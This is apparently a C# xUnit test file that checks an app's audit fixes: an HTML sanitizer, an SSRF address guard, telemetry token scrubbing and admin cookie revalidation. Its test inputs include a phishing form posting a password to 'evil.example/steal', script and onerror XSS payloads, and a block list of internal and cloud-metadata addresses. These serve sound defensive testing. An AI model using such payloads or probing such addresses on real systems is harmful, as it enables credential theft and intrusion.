using System;
using System.Linq;
using System.Net;
using IPRO.Business.Services;
using IPRO.Entities;
using IPRO.Utility;
using IPRO.Web.Infrastructure;
using Microsoft.ApplicationInsights.DataContracts;
using Xunit;

namespace IPRO.IntegrationTests;

// The 2026-08-20 medium-severity batch. Each region pins one finding closed on
// fix/audit-medium-seven so it cannot quietly reopen.
public class MediumAuditFixTests
{
    // ---------------------------------------------------------- A5-M-SANITIZER + DEP-AngleSharp --
    // The sanitizer must strip what a phishing email needs (form controls, overlay positioning)
    // while keeping the inline formatting real newsletters are built from. These tests also stand
    // guard over the HtmlSanitizer 9.0.967 -> 9.2.995 / AngleSharp 0.17.1 -> 1.7.1 upgrade: if the
    // new parser changed basic sanitisation behaviour, they fail loudly.

    [Theory]
    [InlineData("<form action='https://evil.example/steal'><input name='password'></form>")]
    [InlineData("<button onclick='x'>Log in again</button>")]
    [InlineData("<select><option>a</option></select><textarea>x</textarea>")]
    public void Form_controls_do_not_survive_sanitisation(string html)
    {
        var outp = HtmlContentSanitizer.Sanitize(html).ToLowerInvariant();
        Assert.DoesNotContain("<form", outp);
        Assert.DoesNotContain("<input", outp);
        Assert.DoesNotContain("<button", outp);
        Assert.DoesNotContain("<select", outp);
        Assert.DoesNotContain("<textarea", outp);
    }

    [Fact]
    public void Overlay_positioning_is_stripped_from_inline_style()
    {
        var outp = HtmlContentSanitizer.Sanitize(
            "<div style=\"position:fixed;top:0;left:0;z-index:9999;color:#333\">overlay</div>");
        Assert.DoesNotContain("position", outp, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("z-index", outp, StringComparison.OrdinalIgnoreCase);
        // ...but ordinary formatting on the same element survives.
        Assert.Contains("color", outp, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Newsletter_formatting_survives()
    {
        var outp = HtmlContentSanitizer.Sanitize(
            "<table><tr><td style=\"padding:8px;background-color:#f0f0f0\"><b>Hi</b> <a href=\"https://example.com\">link</a> <img src=\"https://example.com/x.png\" alt=\"\"></td></tr></table>");
        Assert.Contains("<table", outp);
        Assert.Contains("<b>", outp);
        Assert.Contains("href", outp);
        Assert.Contains("<img", outp);
        Assert.Contains("padding", outp);
    }

    [Fact]
    public void Script_still_dies_after_the_parser_upgrade()
    {
        var outp = HtmlContentSanitizer.Sanitize("<p>x</p><script>alert(1)</script><img src=x onerror=alert(1)>");
        Assert.DoesNotContain("script", outp, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", outp, StringComparison.OrdinalIgnoreCase);
    }

    // ----------------------------------------------------------------------------- A5-M-SSRF --

    [Theory]
    [InlineData("127.0.0.1")]
    [InlineData("10.0.0.5")]
    [InlineData("172.16.1.1")]
    [InlineData("192.168.1.10")]
    [InlineData("169.254.169.254")]
    [InlineData("100.64.0.1")]
    [InlineData("0.0.0.0")]
    [InlineData("::1")]
    [InlineData("fe80::1")]
    [InlineData("fd00::1")]
    public void Internal_addresses_are_blocked(string ip) =>
        Assert.True(PublicHostGuard.IsBlockedAddress(IPAddress.Parse(ip)));

    [Theory]
    [InlineData("8.8.8.8")]
    [InlineData("104.16.1.1")]
    [InlineData("2607:f8b0:4004:800::200e")]
    public void Public_addresses_are_allowed(string ip) =>
        Assert.False(PublicHostGuard.IsBlockedAddress(IPAddress.Parse(ip)));

    [Fact]
    public void An_ip_literal_hostname_is_refused_but_a_domain_is_not()
    {
        Assert.True(PublicHostGuard.IsBlockedHost("169.254.169.254"));
        Assert.True(PublicHostGuard.IsBlockedHost("[::1]"));
        Assert.True(PublicHostGuard.IsBlockedHost("  127.0.0.1. "));
        Assert.False(PublicHostGuard.IsBlockedHost("www.example.com"));
        // A PUBLIC IP literal is not blocked by shape alone -- the resolved-address screen decides.
        Assert.False(PublicHostGuard.IsBlockedHost("8.8.8.8"));
    }

    [Fact]
    public void One_internal_address_in_a_resolved_set_blocks_the_set() =>
        Assert.True(PublicHostGuard.AnyBlocked(new[] { IPAddress.Parse("104.16.1.1"), IPAddress.Parse("10.0.0.9") }));

    // --------------------------------------------------------------------------- SO-M-NEW-6 --

    private static RequestTelemetry Scrub(string url, string? name = null)
    {
        var t = new RequestTelemetry { Url = new Uri(url) };
        if (name != null) t.Name = name;
        new SensitiveDataTelemetryInitializer().Initialize(t);
        return t;
    }

    [Fact]
    public void Invoice_path_tokens_are_scrubbed()
    {
        var t = Scrub("https://app.iproadvisers.com/invoice/SECRETTOKEN123", "GET /invoice/SECRETTOKEN123");
        Assert.DoesNotContain("SECRETTOKEN123", t.Url.ToString());
        Assert.Contains("/invoice/REDACTED", t.Url.ToString());
        Assert.DoesNotContain("SECRETTOKEN123", t.Name);
    }

    [Fact]
    public void Testimonial_path_tokens_are_scrubbed_including_subpaths()
    {
        Assert.Contains("/testimonial/REDACTED", Scrub("https://x.example/testimonial/tok123").Url.ToString());
        var approve = Scrub("https://x.example/invoice/tok123/approve");
        Assert.Contains("/invoice/REDACTED/approve", approve.Url.ToString());
    }

    [Fact]
    public void Query_tokens_are_still_scrubbed_and_unrelated_urls_untouched()
    {
        Assert.Contains("token=REDACTED", Scrub("https://x.example/email-preferences?token=abc&x=1").Url.ToString());
        var untouched = "https://x.example/portal/Dashboard?tab=2";
        Assert.Equal(untouched, Scrub(untouched).Url.ToString());
    }

    // ------------------------------------------------------------------------------ ADMIN-7 --

    [Fact]
    public void A_missing_or_deactivated_admin_is_rejected()
    {
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(null, AdminRoles.SuperAdmin));
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(
                new AdminUser { IsActive = false, Role = AdminRoles.SuperAdmin }, AdminRoles.SuperAdmin));
    }

    [Fact]
    public void A_role_change_invalidates_the_cookie_in_both_directions()
    {
        var demoted = new AdminUser { IsActive = true, Role = AdminRoles.Support };
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(demoted, AdminRoles.SuperAdmin));
        var promoted = new AdminUser { IsActive = true, Role = AdminRoles.SuperAdmin };
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(promoted, AdminRoles.Support));
    }

    [Fact]
    public void An_unchanged_active_admin_passes()
    {
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Ok,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(
                new AdminUser { IsActive = true, Role = AdminRoles.SuperAdmin }, AdminRoles.SuperAdmin));
    }

    // ----------------------------------------------------------------- ADMIN-10 (source walk) --

    [Fact]
    public void RebuildResources_requires_the_SuperAdmin_policy()
    {
        var method = typeof(IPRO.Admin.Controllers.AgentsController).GetMethod("RebuildResources");
        Assert.NotNull(method);
        var attrs = method!.GetCustomAttributes(typeof(Microsoft.AspNetCore.Authorization.AuthorizeAttribute), false)
            .Cast<Microsoft.AspNetCore.Authorization.AuthorizeAttribute>();
        Assert.Contains(attrs, a => a.Policy == "SuperAdmin");
    }
}
